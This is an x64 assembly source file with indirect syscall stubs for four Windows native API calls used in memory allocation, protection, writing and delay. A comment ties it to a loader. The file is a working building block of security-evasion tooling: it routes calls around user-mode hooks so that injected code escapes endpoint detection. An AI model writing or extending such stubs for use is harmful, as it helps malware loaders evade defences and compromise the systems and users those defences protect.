; syscalls.asm - Indirect Syscall Implementation for x64
; Using C linkage (no name mangling) like lodar

.code

PUBLIC Asm_NtAllocateVirtualMemory
PUBLIC Asm_NtProtectVirtualMemory
PUBLIC Asm_NtWriteVirtualMemory
PUBLIC Asm_NtDelayExecution

EXTERN wNtAllocateVirtualMemory:DWORD
EXTERN wNtProtectVirtualMemory:DWORD
EXTERN wNtWriteVirtualMemory:DWORD
EXTERN wNtDelayExecution:DWORD

EXTERN sysAddrNtAllocateVirtualMemory:QWORD
EXTERN sysAddrNtProtectVirtualMemory:QWORD
EXTERN sysAddrNtWriteVirtualMemory:QWORD
EXTERN sysAddrNtDelayExecution:QWORD

Asm_NtAllocateVirtualMemory PROC
    mov r10, rcx
    mov eax, wNtAllocateVirtualMemory
    jmp QWORD PTR [sysAddrNtAllocateVirtualMemory]
Asm_NtAllocateVirtualMemory ENDP

Asm_NtProtectVirtualMemory PROC
    mov r10, rcx
    mov eax, wNtProtectVirtualMemory
    jmp QWORD PTR [sysAddrNtProtectVirtualMemory]
Asm_NtProtectVirtualMemory ENDP

Asm_NtWriteVirtualMemory PROC
    mov r10, rcx
    mov eax, wNtWriteVirtualMemory
    jmp QWORD PTR [sysAddrNtWriteVirtualMemory]
Asm_NtWriteVirtualMemory ENDP

Asm_NtDelayExecution PROC
    mov r10, rcx
    mov eax, wNtDelayExecution
    jmp QWORD PTR [sysAddrNtDelayExecution]
Asm_NtDelayExecution ENDP

END
